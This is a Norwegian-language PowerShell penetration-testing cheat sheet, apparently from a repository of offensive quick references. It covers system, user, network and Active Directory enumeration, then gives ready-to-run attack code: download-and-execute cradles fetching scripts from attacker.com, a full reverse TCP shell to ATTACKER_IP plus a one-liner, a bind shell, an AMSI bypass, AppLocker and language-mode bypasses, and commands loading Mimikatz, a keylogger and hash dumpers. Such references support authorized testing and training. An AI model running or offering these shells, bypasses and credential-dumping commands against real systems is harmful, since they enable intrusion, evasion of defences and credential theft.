# 💻 PowerShell – komplett hurtigreferanse for penetrasjonstesting

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
> **Versjoner og begreper:** Eksemplene blander Windows PowerShell, nyere PowerShell og eksterne AD-/offensive moduler. Tilgjengelige cmdleter og aliaser varierer, og `Get-WmiObject` finnes ikke i PowerShell 7; se [Microsofts kompatibilitetsoversikt](https://learn.microsoft.com/en-us/powershell/scripting/whats-new/differences-from-windows-powershell). Kjøringspolicy er ikke en sikkerhetsgrense; se [Microsofts forklaring](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies). De viste AMSI-/AppLocker-/språkmodus-eksemplene er historiske og miljøavhengige, ikke universelle omgåelser. Minneeksemplet med Add-Type inneholder bare deklarasjoner og en plassholder for resten av koden. Påstander som «raskere», «mer diskret» og «fileless» garanterer ikke ytelse eller fravær av logger. Et omvendt shell kobler fra mål til lytter; ADS er alternative datastrømmer på et støttet filsystem.


```
  ██████╗  ██████╗ ██╗    ██╗███████╗██████╗ ███████╗██╗  ██╗███████╗██╗     ██╗     
  ██╔══██╗██╔═══██╗██║    ██║██╔════╝██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     
  ██████╔╝██║   ██║██║ █╗ ██║█████╗  ██████╔╝███████╗███████║█████╗  ██║     ██║     
  ██╔═══╝ ██║   ██║██║███╗██║██╔══╝  ██╔══██╗╚════██║██╔══██║██╔══╝  ██║     ██║     
  ██║     ╚██████╔╝╚███╔███╔╝███████╗██║  ██║███████║██║  ██║███████╗███████╗███████╗
  ╚═╝      ╚═════╝  ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/PowerShell-blue?style=for-the-badge&logo=powershell" alt="PowerShell">
  <img src="https://img.shields.io/badge/Windows-Hacking-red?style=for-the-badge" alt="Hacking">
  <img src="https://img.shields.io/badge/Post_Exploitation-orange?style=for-the-badge" alt="Etter utnyttelse">
</p>

---

## 📋 Innholdsfortegnelse

- [Grunnleggende bruk](#-grunnleggende-bruk)
- [Systemkartlegging](#-systemkartlegging)
- [Brukerkartlegging](#-brukerkartlegging)
- [Nettverkskommandoer](#-nettverkskommandoer)
- [Filoperasjoner](#-filoperasjoner)
- [Administrasjon av prosesser og tjenester](#-administrasjon-av-prosesser-og-tjenester)
- [Registeroperasjoner](#-registeroperasjoner)
- [Active Directory](#-active-directory)
- [Nedlasting og kjøring](#-nedlasting-og-kjøring)
- [Omvendte shell](#-omvendte-shell)
- [Omgåelsesteknikker](#-omgåelsesteknikker)
- [Offensive verktøy](#-offensive-verktøy)
- [Kommandoer på én linje](#-kommandoer-på-én-linje)

---

## 🔰 Grunnleggende bruk

### Kjøringspolicy

```powershell
# Kontroller gjeldende policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Omgå kjøringspolicyen (gjeldende økt)
Set-ExecutionPolicy Bypass -Scope Process
Set-ExecutionPolicy Unrestricted -Scope CurrentUser

# Kjør skript ved å omgå policyen
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -File script.ps1
```

### Hente hjelp

```powershell
# Hent hjelp til kommando
Get-Help Get-Process
Get-Help Get-Process -Full
Get-Help Get-Process -Examples

# Oppdater hjelpen
Update-Help

# List alle kommandoer
Get-Command
Get-Command -Module ActiveDirectory
Get-Command *process*
```

### Variabler og operatorer

```powershell
# Variabler
$var = "value"
$number = 42
$array = @(1, 2, 3)
$hash = @{key="value"; name="test"}

# Miljøvariabler
$env:USERNAME
$env:COMPUTERNAME
$env:USERDOMAIN
$env:PATH
Get-ChildItem Env:

# Sammenligningsoperatorer
-eq   # Lik
-ne   # Ikke lik
-gt   # Større enn
-lt   # Mindre enn
-like # Samsvar med jokertegn
-match # Samsvar med regulært uttrykk
```

### Rørledning og filtrering

```powershell
# Send utdata videre i en rørledning
Get-Process | Where-Object {$_.CPU -gt 10}
Get-Service | Where-Object Status -eq "Running"

# Velg egenskaper
Get-Process | Select-Object Name, CPU, Id
Get-Process | Select-Object -First 5

# Sorter
Get-Process | Sort-Object CPU -Descending

# Formater utdata
Get-Process | Format-Table -AutoSize
Get-Process | Format-List *
Get-Process | Out-GridView
```

---

## 🔍 Systemkartlegging

### Systeminformasjon

```powershell
# Maskininformasjon
Get-ComputerInfo
systeminfo
hostname
$env:COMPUTERNAME

# OS-versjon
[System.Environment]::OSVersion
(Get-WmiObject Win32_OperatingSystem).Caption
(Get-CimInstance Win32_OperatingSystem).Version

# Arkitektur
[Environment]::Is64BitOperatingSystem
$env:PROCESSOR_ARCHITECTURE

# Hurtigrettinger og oppdateringer
Get-HotFix
Get-HotFix | Where-Object InstalledOn -gt (Get-Date).AddDays(-30)
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Installert programvare

```powershell
# 64-bit-programvare
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# 32-bit-programvare på 64-bit-OS
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | 
    Select-Object DisplayName, Publisher, InstallDate

# Ved hjelp av WMI
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Kort oversikt
Get-Package
```

### Antivirus og sikkerhet

```powershell
# Hent antivirusinformasjon
Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct
Get-MpComputerStatus  # Windows Defender

# Brannmurstatus
Get-NetFirewallProfile
netsh advfirewall show allprofiles

# Brannmurregler
Get-NetFirewallRule | Where-Object Enabled -eq True
Get-NetFirewallRule -DisplayName "*Remote*"

# Unntak i Windows Defender
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
```

### Planlagte oppgaver

```powershell
# List planlagte oppgaver
Get-ScheduledTask
Get-ScheduledTask | Where-Object State -eq "Ready"

# Oppgavedetaljer
Get-ScheduledTask -TaskName "TaskName" | Get-ScheduledTaskInfo

# schtasks
schtasks /query /fo LIST /v
```

---

## 👤 Brukerkartlegging

### Lokale brukere

```powershell
# Gjeldende bruker
whoami
$env:USERNAME
[Environment]::UserName
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

# Alle lokale brukere
Get-LocalUser
Get-LocalUser | Select-Object Name, Enabled, LastLogon
net user

# Brukerdetaljer
Get-LocalUser Administrator
net user Administrator

# Brukergrupper
Get-LocalGroupMember Administrators
net localgroup Administrators
```

### Brukerrettigheter

```powershell
# Gjeldende rettigheter
whoami /priv
whoami /all
whoami /groups

# Kontroller administratorstatus
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
```

### Grupper

```powershell
# List lokale grupper
Get-LocalGroup
net localgroup

# Gruppemedlemmer
Get-LocalGroupMember "Administrators"
Get-LocalGroupMember "Remote Desktop Users"
net localgroup "Administrators"
```

### Påloggede brukere

```powershell
# Pålogget nå
query user
quser
qwinsta

# Nylige pålogginger
Get-WmiObject Win32_LogonSession | Select-Object LogonId, LogonType, StartTime
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10
```

---

## 🌐 Nettverkskommandoer

### Nettverkskonfigurasjon

```powershell
# IP-konfigurasjon
Get-NetIPConfiguration
Get-NetIPAddress
ipconfig /all

# DNS
Get-DnsClientServerAddress
ipconfig /displaydns

# Ruter
Get-NetRoute
route print

# ARP-tabell
Get-NetNeighbor
arp -a
```

### Åpne porter og tilkoblinger

```powershell
# TCP-tilkoblinger
Get-NetTCPConnection
Get-NetTCPConnection -State Listen
Get-NetTCPConnection | Where-Object State -eq "Established"
netstat -ano

# UDP-tilkoblinger
Get-NetUDPEndpoint

# Finn prosess ved hjelp av port
Get-NetTCPConnection -LocalPort 80 | Select-Object OwningProcess
Get-Process -Id (Get-NetTCPConnection -LocalPort 80).OwningProcess
```

### Nettverkstesting

```powershell
# Ping
Test-Connection google.com
Test-Connection -ComputerName 192.168.1.1 -Count 4

# Portkontroll
Test-NetConnection -ComputerName 192.168.1.1 -Port 445
Test-NetConnection -ComputerName google.com -Port 443

# Spor ruten
Test-NetConnection -ComputerName google.com -TraceRoute

# DNS-oppslag
Resolve-DnsName google.com
nslookup google.com
```

### Nettverksdelinger

```powershell
# List delinger
Get-SmbShare
net share

# Koble til nettverksstasjon
New-PSDrive -Name Z -PSProvider FileSystem -Root "\\server\share"
net use Z: \\server\share

# List tilkoblede delinger
Get-SmbConnection
net use

# Åpne deling
Get-ChildItem \\server\share
dir \\192.168.1.1\c$
```

---

## 📁 Filoperasjoner

### Navigasjon og oversikter

```powershell
# Gjeldende katalog
Get-Location
pwd

# Bytt katalog
Set-Location C:\Users
cd C:\Users

# List filer
Get-ChildItem
Get-ChildItem -Force  # Ta med skjulte filer
Get-ChildItem -Recurse
ls
dir

# List skjulte filer
Get-ChildItem -Hidden
Get-ChildItem -Attributes Hidden
dir /a:h
```

### Filsøk

```powershell
# Finn filer etter navn
Get-ChildItem -Path C:\ -Recurse -Name "*.txt" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Recurse -Filter "password*" -ErrorAction SilentlyContinue

# Finn filer som inneholder tekst
Get-ChildItem -Recurse | Select-String "password"
Select-String -Path "C:\*.txt" -Pattern "password"

# Finn store filer
Get-ChildItem -Recurse | Where-Object Length -gt 100MB

# Finn nylig endrede filer
Get-ChildItem -Recurse | Where-Object LastWriteTime -gt (Get-Date).AddDays(-7)
```

### Lese og skrive filer

```powershell
# Les fil
Get-Content file.txt
Get-Content file.txt -Head 10
Get-Content file.txt -Tail 10
type file.txt
cat file.txt

# Skriv til fil
Set-Content file.txt "content"
Add-Content file.txt "append"
"content" | Out-File file.txt
"content" >> file.txt  # Legg til på slutten

# Kopier, flytt og slett
Copy-Item source.txt destination.txt
Move-Item source.txt destination.txt
Remove-Item file.txt
Remove-Item folder -Recurse -Force
```

### Alternative datastrømmer (ADS)

```powershell
# List ADS
Get-Item file.txt -Stream *
dir /r file.txt

# Les ADS
Get-Content file.txt -Stream secret
more < file.txt:secret

# Skriv til ADS
Set-Content file.txt -Stream hidden "secret data"
echo "data" > file.txt:hidden

# Fjern ADS
Remove-Item file.txt -Stream hidden
```

### Hashing

```powershell
# Hent filhash
Get-FileHash file.txt
Get-FileHash file.txt -Algorithm MD5
Get-FileHash file.txt -Algorithm SHA256
Get-FileHash file.txt -Algorithm SHA512

# Kontroller hash
(Get-FileHash file.txt).Hash -eq "expected_hash"
```

---

<a id="-administrasjon-av-prosesser-og-tjenester"></a>
## ⚙️ Administrasjon av prosesser og tjenester

### Prosesser

```powershell
# List prosesser
Get-Process
Get-Process | Sort-Object CPU -Descending
Get-Process -Name "chrome"
tasklist

# Prosessdetaljer
Get-Process -Id 1234 | Format-List *
Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine

# Start prosess
Start-Process notepad.exe
Start-Process -FilePath "cmd.exe" -ArgumentList "/c whoami"
Start-Process -FilePath "powershell.exe" -Verb RunAs  # Som administrator

# Stopp prosess
Stop-Process -Name "notepad"
Stop-Process -Id 1234 -Force
taskkill /PID 1234 /F
```

### Tjenester

```powershell
# List tjenester
Get-Service
Get-Service | Where-Object Status -eq "Running"
Get-Service | Where-Object StartType -eq "Automatic"
sc query

# Tjenestedetaljer
Get-Service -Name "WinRM" | Format-List *
Get-WmiObject Win32_Service | Select-Object Name, StartMode, PathName

# Start og stopp tjenester
Start-Service -Name "WinRM"
Stop-Service -Name "WinRM"
Restart-Service -Name "WinRM"
net start WinRM
net stop WinRM

# Tjenestesti (for kontroll av stier uten anførselstegn)
Get-WmiObject Win32_Service | Select-Object Name, PathName | Where-Object {$_.PathName -notlike '"*'}
```

---

## 📝 Registeroperasjoner

### Lese registeret

```powershell
# List registernøkler
Get-ChildItem HKLM:\SOFTWARE
Get-ChildItem HKCU:\SOFTWARE

# Hent registerverdi
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemPropertyValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "SecurityHealth"

# Søk i registeret
Get-ChildItem HKLM:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match "password"}
```

### Skrive til registeret

```powershell
# Opprett nøkkel
New-Item -Path HKCU:\SOFTWARE\MyKey

# Angi verdi
Set-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value" -Value "Data"
New-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "NewValue" -Value "Data" -PropertyType String

# Slett
Remove-ItemProperty -Path HKCU:\SOFTWARE\MyKey -Name "Value"
Remove-Item -Path HKCU:\SOFTWARE\MyKey -Recurse
```

### Viktige registerplasseringer

```powershell
# Plasseringer for automatisk oppstart
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Avinstallering (installert programvare)
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*

# SAM (krever SYSTEM)
# HKLM:\SAM\SAM

# LSA-hemmeligheter
# HKLM:\SECURITY\Policy\Secrets
```

---

## 🏢 Active Directory

### Domeneinformasjon

```powershell
# Domeneinformasjon
Get-ADDomain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$env:USERDNSDOMAIN

# Domenekontrollere
Get-ADDomainController
Get-ADDomainController -Filter * | Select-Object Name, IPv4Address

# Skoginformasjon
Get-ADForest

# Tillitsforhold
Get-ADTrust -Filter *
```

### Brukerkartlegging (AD)

```powershell
# Alle domenebrukere
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled

# Bestemt bruker
Get-ADUser -Identity administrator -Properties *

# Brukere med en bestemt egenskap
Get-ADUser -Filter {AdminCount -eq 1}  # Administratorer
Get-ADUser -Filter {ServicePrincipalName -ne "$null"}  # Mulige Kerberoasting-mål

# Søk etter brukere
Get-ADUser -Filter {Name -like "*admin*"}
Get-ADUser -Filter {Description -like "*password*"}
```

### Gruppekartlegging (AD)

```powershell
# Alle grupper
Get-ADGroup -Filter *

# Domain Admins
Get-ADGroupMember "Domain Admins"
Get-ADGroupMember "Domain Admins" -Recursive

# Enterprise Admins
Get-ADGroupMember "Enterprise Admins"

# Brukerens grupper
Get-ADPrincipalGroupMembership username
```

### Maskinkartlegging (AD)

```powershell
# Alle maskiner
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties *

# Domenekontrollere
Get-ADComputer -Filter {PrimaryGroupId -eq 516}

# Servere
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
```

### GPO-informasjon

```powershell
# List GPO-er
Get-GPO -All
Get-GPO -All | Select-Object DisplayName, GpoStatus

# GPO-detaljer
Get-GPO -Name "Default Domain Policy"

# GPO-rapport
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html
```

---

<a id="-nedlasting-og-kjøring"></a>
## ⬇️ Nedlasting og kjøring

### Laste ned filer

```powershell
# Invoke-WebRequest (tilsvarer wget/curl)
Invoke-WebRequest -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
iwr -Uri "http://attacker.com/file.exe" -OutFile "file.exe"
wget "http://attacker.com/file.exe" -OutFile "file.exe"

# WebClient (raskere ifølge originalen)
(New-Object Net.WebClient).DownloadFile("http://attacker.com/file.exe", "C:\file.exe")

# Last ned tekststreng (for skript)
(New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")

# Invoke-RestMethod
Invoke-RestMethod -Uri "http://attacker.com/file.exe" -OutFile "file.exe"

# BITS-overføring (mer diskret ifølge originalen)
Start-BitsTransfer -Source "http://attacker.com/file.exe" -Destination "file.exe"

# certutil (LOLBin)
certutil -urlcache -split -f "http://attacker.com/file.exe" file.exe
```

### Laste ned og kjøre (i minnet)

```powershell
# IEX – Invoke-Expression (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX (iwr 'http://attacker.com/script.ps1')

# Med variabel
$script = (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
IEX $script

# Invoke-Command
Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')}
```

### Kodet kjøring

```powershell
# Base64-kod kommandoen
$command = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
echo $encoded

# Kjør kodet innhold
powershell -enc <base64_string>
powershell -EncodedCommand <base64_string>

# Koder på én linje
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"))
```

---

## 🔌 Omvendte shell

### Omvendt PowerShell-shell

```powershell
# Omvendt TCP-shell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Omvendt shell på én linje

```powershell
# Nishang
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444

# PowerCat
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/powercat.ps1')
powercat -c ATTACKER_IP -p 4444 -e cmd

# Powerline
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Lyttende shell (bind shell)

```powershell
# Bind til port
$listener = [System.Net.Sockets.TcpListener]4444
$listener.Start()
$client = $listener.AcceptTcpClient()
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
$listener.Stop()
```

---

<a id="-omgåelsesteknikker"></a>
## 🛡️ Omgåelsesteknikker

### Omgåelse av kjøringspolicy

```powershell
# Omgåelsesmetoder
powershell -ep bypass
powershell -ExecutionPolicy Bypass
Set-ExecutionPolicy Bypass -Scope Process

# Les og send gjennom en rørledning
Get-Content script.ps1 | PowerShell -NoProfile -
type script.ps1 | PowerShell -NoProfile -

# Last ned tekststreng (ingen fil på disk)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

### Omgåelse av AMSI

```powershell
# Enkel AMSI-omgåelse (kan oppdages)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Tilslørt
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# Endring av minne (krever administrator ifølge originalen)
$win32 = @"
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $win32
# ... (fullstendig omgåelseskode)
```

### Omgåelse av Constrained Language Mode

```powershell
# Kontroller språkmodus
$ExecutionContext.SessionState.LanguageMode

# Hvis ConstrainedLanguage, prøv:
# - PowerShell 2.0 (hvis tilgjengelig)
powershell -version 2

# - InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```

### Omgåelse av AppLocker

```powershell
# MSBuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload.exe

# Regasm/Regsvcs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# Kontroller AppLocker-regler
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```

---

## 🔫 Offensive verktøy

### PowerSploit

```powershell
# Last ned
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerSploit/Recon/PowerView.ps1')

# PowerView (AD-kartlegging)
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Find-LocalAdminAccess
Invoke-UserHunter

# PowerUp (rettighetseskalering)
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1')
Invoke-AllChecks

# Invoke-Mimikatz
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### Empire/PowerShell Empire

```powershell
# Kjøring av stager (fra Empire)
powershell -noP -sta -w 1 -enc <base64_payload>
```

### Nishang

```powershell
# Omvendt shell
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Shells/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444

# Tastelogger
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Keylogger.ps1')
Keylogger

# Get-PassHashes
IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/nishang/Gather/Get-PassHashes.ps1')
Get-PassHashes
```

---

## ⚡ Kommandoer på én linje

### Kartleggingskommandoer på én linje

```powershell
# Systeminformasjon
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Brukere
Get-LocalUser | Select Name,Enabled

# Installert programvare
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName

# Åpne porter
Get-NetTCPConnection -State Listen | Select LocalAddress,LocalPort,OwningProcess

# Tjenester som kjører
Get-Service | Where Status -eq Running | Select Name,DisplayName

# Planlagte oppgaver
schtasks /query /fo TABLE | findstr /v "TaskName"

# Antivirusstatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled

# Brannmur
Get-NetFirewallProfile | Select Name,Enabled
```

### Nedlastingskommandoer på én linje

```powershell
# PowerShell-nedlasting
(New-Object Net.WebClient).DownloadFile("http://url/file","C:\file")
IEX (New-Object Net.WebClient).DownloadString("http://url/script.ps1")
Invoke-WebRequest -Uri "http://url/file" -OutFile "file"

# certutil
certutil -urlcache -split -f "http://url/file" file

# bitsadmin
bitsadmin /transfer job /download /priority high http://url/file C:\file
```

### Kommandotabell

| Formål | Kommando |
|---------|---------|
| Gjeldende bruker | `whoami` |
| Alle brukere | `Get-LocalUser` |
| Administratorer | `Get-LocalGroupMember Administrators` |
| Systeminformasjon | `systeminfo` |
| IP-konfigurasjon | `Get-NetIPAddress` |
| Åpne porter | `Get-NetTCPConnection -State Listen` |
| Prosesser | `Get-Process` |
| Tjenester | `Get-Service \| Where Status -eq Running` |
| Finn filer | `Get-ChildItem -Recurse -Filter "*.txt"` |
| Søk i innhold | `Select-String -Path "C:\*" -Pattern "password"` |
| Last ned fil | `(New-Object Net.WebClient).DownloadFile("url","file")` |
| Kodet kjøring | `powershell -enc <base64>` |

---

## 📚 Ressurser

- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
- [Nishang](https://github.com/samratashok/nishang)
- [PowerShell Empire](https://github.com/EmpireProject/Empire)
- [LOLBAS](https://lolbas-project.github.io/)
- [HackTricks om PowerShell](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)

### Relaterte hurtigreferanser
- [Mimikatz](../../Mimikatz/translations/README.nb.md)
- [Rettighetseskalering i Windows](../../Windows-PrivEsc/README.md)
- [Metasploit](../../Metasploit/translations/README.nb.md)

---

<p align="center">
  <b>💻 Lær PowerShell for penetrasjonstesting!</b><br>
  <i>Et kraftig skriptspråk for Windows</i>
</p>
